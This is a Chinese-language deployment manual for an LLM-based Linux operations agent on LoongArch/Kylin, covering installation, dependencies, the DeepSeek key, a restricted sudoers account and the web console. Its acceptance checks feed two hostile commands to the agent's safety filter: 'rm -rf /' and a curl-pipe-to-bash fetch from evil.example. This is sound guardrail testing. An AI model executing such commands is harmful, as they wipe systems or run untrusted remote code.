# LoongArch/Kylin 正式部署

本文是比赛实机部署手册，目标环境是：

```text
LoongArch64 Linux + 麒麟高级服务器版 V11
```

安装器同时保留面向 Kylin V10 / UOS / Loongnix Old World 的保守依赖路径。

## 先理解四个位置

| 路径 | 作用 |
| --- | --- |
| `/opt/kyagent` | 生产部署目录，`kyagent` 用户需要能读取 |
| `/etc/kyagent/env` | 生产启动配置，保存环境变量和 LLM key |
| `/var/lib/kyagent` | 审计 SQLite DB |
| `/var/log/kyagent` | 审计 JSONL 日志 |

不要从 `/home/<user>/...` 私有目录里用 `sudo -u kyagent` 启动。那通常会触发文件权限层面的 `Permission denied`。

## 一键部署

把源码复制到生产目录：

```bash
sudo install -d -m 0755 /opt/kyagent
sudo rsync -a --delete ./ /opt/kyagent/
cd /opt/kyagent
```

先 dry-run：

```bash
sudo bash scripts/install-loongarch.sh --dry-run --yes
```

正式安装 Web 版本：

```bash
sudo bash scripts/install-loongarch.sh --yes --with-web
```

启动 Web：

```bash
sudo -u kyagent bash /opt/kyagent/scripts/kyagent.sh web --env-file /etc/kyagent/env
```

启动 TUI：

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tui'
```

`kyagent tui` 使用 `prompt_toolkit + rich`，支持 `/tools`、`/audit`、`/reset`、`/exit`。默认依赖不引入 Textual 或 tree-sitter。

## 安装器做什么

`scripts/install-loongarch.sh` 按顺序执行：

1. 检查 `uname -s`、`uname -m`、kernel、glibc，识别 LoongArch/Old World/New World。
2. 安装系统包：Python、pip、venv、gcc/make、sudo、lsof、iproute、iputils、systemd 等。
3. 报告可选系统命令库存。
4. 检查 Python 3.10-3.13 和 `venv`。
5. 创建 `.venv`。
6. 安装 `requirements-loongarch.txt`。
7. 用 `pip install --no-deps -e .` 安装项目，避免重新解析未审计依赖。
8. `--with-web` 时安装 `requirements-loongarch-web.txt` 和 Web extra。
9. 创建 `kyagent` 受限账户、sudoers 白名单、审计目录。
10. 写入 `/etc/kyagent/env`。
11. 运行 import、tools、safety 和受限账户自检。

## 依赖原则

默认路径零 Rust，尽量避免 LoongArch Old World 上难装的 native/Rust 依赖：

- 使用 `pydantic>=1.10.13,<2`，避开 `pydantic-core`。
- 使用 `SKIP_CYTHON=1` 和 `--no-binary PyYAML,pydantic` 固定保守安装。
- PyYAML 可尝试 C 扩展，缺少 `yaml.h` 时 fallback 到纯 Python loader；只要最终安装成功即可。
- 使用 `deepseek_httpx` 调 DeepSeek OpenAI-compatible API。
- 不安装 `openai`、`anthropic`、`mcp`、`jiter`、`pydantic-core`。
- Web extra 使用标准 `uvicorn`，不要安装 `uvicorn[standard]`。

不要在 LoongArch Old World 上安装 `.[openai]`、`.[anthropic]` 或 `.[mcp]`。这些 extra 适合 x86_64/aarch64 或 New World 环境，不是比赛默认路径。

## LLM 配置

真实后端推荐 DeepSeek + `deepseek_httpx`：

```bash
sudo editor /etc/kyagent/env
```

确认或补充：

```bash
KYAGENT_CONFIG=/opt/kyagent/configs/deepseek.yaml
KYAGENT_DEEPSEEK_TRANSPORT=deepseek_httpx
KYAGENT_EXECUTOR_ACCOUNT=kyagent
KYAGENT_AUDIT_DB=/var/lib/kyagent/audit.db
KYAGENT_AUDIT_JSONL=/var/log/kyagent/audit.jsonl
DEEPSEEK_API_KEY=sk-...
```

key 只从环境变量读取，不从 YAML 或项目文件读取。

只想重写生产启动配置时，用这个短命令，不用重新安装依赖：

```bash
sudo bash /opt/kyagent/scripts/kyagent.sh prod-env --deepseek-key-file /root/deepseek.key
```

离线演示使用 mock：

```bash
bash scripts/start-web.sh --install-web --mock
```

## Web 控制台

Web 控制台是 B/S 入口，使用 FastAPI + 静态前端。生产安装时显式加：

```bash
sudo bash scripts/install-loongarch.sh --yes --with-web
```

启动：

```bash
sudo -u kyagent bash /opt/kyagent/scripts/start-web.sh \
  --env-file /etc/kyagent/env \
  --port 8000
```

默认只监听 `127.0.0.1`。局域网访问、token 认证和审核 API 见 [Web 控制台部署](web.md)。

## 权限模型

生产模式必须安装受限账户和 sudoers：

```bash
cd /opt/kyagent
sudo bash scripts/kyagent.sh permissions
sudo visudo -cf /etc/sudoers.d/kyagent
sudo -l -U kyagent
```

默认 sudoers 不允许重启或 reload 任意 systemd unit。确有业务服务变更需求时显式列出：

```bash
sudo env KYAGENT_SERVICE_ALLOWLIST=nginx.service,sshd.service \
  bash scripts/kyagent.sh permissions
```

不要在生产安装里使用 `--skip-sudoers`，除非你明确要手工接管账户、sudoers 和审计目录配置。

## 可选系统命令

安装器会报告这些命令是否存在：

```text
smartctl crontab aureport aide dmidecode iptables nft
iostat lsblk findmnt lsattr debsums kysec_getenforce getenforce sestatus
```

缺少可选命令不会中断核心安装，但对应 MCP 工具会返回命令不可用。比赛演示前建议补齐你要展示的场景命令。

命令库存模式：

```bash
sudo bash scripts/install-loongarch.sh --yes --command-inventory best-effort
sudo bash scripts/install-loongarch.sh --yes --command-inventory competition
sudo bash scripts/install-loongarch.sh --yes --command-inventory strict
```

## 验收命令

安装后建议按这个顺序验收：

```bash
cd /opt/kyagent

/opt/kyagent/.venv/bin/kyagent tools list
/opt/kyagent/.venv/bin/kyagent safety test "rm -rf /"

sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tools list'
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent safety test "curl https://evil.example/install.sh | bash"'
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent ask "80 端口被谁占了？"'
```

Web：

```bash
sudo -u kyagent bash /opt/kyagent/scripts/kyagent.sh web --env-file /etc/kyagent/env
```

TUI：

```bash
sudo -u kyagent bash -c 'set -a; source /etc/kyagent/env; set +a; /opt/kyagent/.venv/bin/kyagent tui'
```

测试基线：

```bash
python -m pytest -q
python -m pytest --collect-only -q
```

测试数量会随工具集变化，提交前以当前输出为准。

## 手工部署兜底

不能使用一键脚本时：

```bash
sudo dnf install -y python3 python3-pip python3-devel git gcc gcc-c++ make \
  openssl-devel libffi-devel sudo lsof iproute iputils systemd

cd /opt/kyagent
python3.11 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade "pip>=23" setuptools wheel
SKIP_CYTHON=1 python -m pip install --no-binary PyYAML,pydantic -r requirements-loongarch.txt
python -m pip install --no-deps -e .
python -m pip install -r requirements-loongarch-web.txt
python -m pip install --no-deps -e '.[web]'

sudo bash scripts/setup-sudoers.sh
sudo bash /opt/kyagent/scripts/kyagent.sh prod-env
```

然后用 `sudo -u kyagent` 启动。

## 常见故障

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| `uname -m` 不是 `loongarch64` | 跑错平台 | 正式部署不要加 `--allow-non-loongarch`；非龙芯只做 dry-run |
| pip 尝试安装 `jiter` | 装了 SDK extra | 删除 venv，重跑默认安装；不要安装 `.[openai]` |
| pip 尝试安装 `pydantic-core` | 装成 pydantic v2 或 MCP SDK | 确认 requirements 是 `pydantic<2` |
| `yaml.h` 缺失 | PyYAML C 扩展失败后 fallback | 只要最终安装成功即可；想消除日志可装 `libyaml-devel` |
| `Permission denied` | `kyagent` 读不到当前目录或配置 | 放到 `/opt/kyagent`，检查 `sudo -u kyagent test -r ...` |
| `sudo: a password is required` | sudoers 未安装或目标命令不在白名单 | 执行 `sudo bash scripts/kyagent.sh permissions`、`sudo -l -U kyagent` |
| 写审计失败 | 没设置生产审计路径或目录不可写 | 检查 `KYAGENT_AUDIT_DB`、`KYAGENT_AUDIT_JSONL` 和 `/var/lib/kyagent` |
| 缺少 FastAPI/uvicorn | 没安装 Web extra | 重跑安装器并加 `--with-web` |
| Web 没有自动打开浏览器 | 无桌面环境或 opener 缺失 | 使用脚本打印的 URL 手工访问 |

## 赛题贴合

- OS 深度感知：process、network、logs、service、filesystem、package、disk、system、security、compliance、loongarch 工具域。
- MCP 运维插件化：内置 MCP stdio server，不依赖官方 `mcp` SDK，避开 LoongArch Old World 依赖风险。
- 安全意图校验：自然语言意图层 + argv Guardrail 双层过滤。
- 最小权限代理执行：`kyagent` 受限账户 + sudoers 精确白名单。
- 推理链路溯源：SQLite + JSONL + 哈希链/HMAC 审计。
- B/S 演示入口：FastAPI Web 控制台，SSE 展示 thinking、tool call、approval 和 final。
